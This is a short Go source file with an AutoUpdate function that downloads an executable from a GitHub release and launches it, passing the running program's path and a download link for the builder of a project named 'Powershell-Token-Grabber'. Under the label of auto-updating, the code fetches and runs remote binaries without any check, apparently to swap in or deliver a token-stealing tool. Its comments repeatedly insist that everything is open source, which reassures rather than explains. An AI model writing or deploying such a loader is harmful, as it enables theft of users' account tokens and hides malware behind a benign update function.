package autoUpdate

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
)

func AutoUpdate() bool {
	// This url leads to the download of the AutoUpdater, anyone can use this for any package and is completey open source under the MIT license.
	// The Exe is built by github actions and the action that builds it is also open source in the repository.
	url := "https://github.com/KDot227/AutoUpdater/releases/download/AutoBuild/AutoUpdater.exe"
	downloadPath := "AutoUpdater.exe"
	downloadFile(url, downloadPath)

	currentExe, err := os.Executable()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(currentExe)

	cwd, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}

	//All of this is open source and built by github actions
	fmt.Println("AutoUpdater.exe", currentExe, "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/Builder/Builder.exe")
	cmd := exec.Command(cwd+"\\AutoUpdater.exe", currentExe, "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/Builder/Builder.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	err = cmd.Start()
	if err != nil {
		log.Fatal(err)
	}

	//err := os.Remove("AutoUpdater.exe")
	//if err != nil {
	//	log.Fatal(err)
	//}
	return true
}

func downloadFile(url string, downloadPath string) {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	out, err := os.Create(downloadPath)
	if err != nil {
		log.Fatal(err)
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		log.Fatal(err)
	}
}
